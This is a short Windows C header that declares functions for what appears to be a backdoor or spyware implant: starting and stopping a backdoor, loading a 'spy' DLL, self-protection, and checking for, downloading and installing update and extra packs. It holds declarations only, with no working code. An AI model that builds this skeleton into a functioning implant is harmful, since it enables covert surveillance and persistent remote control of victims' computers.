#pragma once
#include <windows.h>
#include "proc.h"

// a looper to keep app alive
void start_looper();
// load dll library
bool init_library();
// bind dll function which exported
bool init_dll_func();
// release dll libary, when exit
void free_library();
// khoi tao backdoor
void init_backdoor();
// shutdown backdoor
void free_backdoor();
// check update then download update pack when is available
bool check_and_dwnl_update();
// install update pack which downloaded
void install_update_pack();
// auto check, download then install another packs
void install_packs();
// start self-protect features
bool start_self_protect();

LOAD_SPY load_spy = NULL;
UNLOAD_SPY unload_spy = NULL;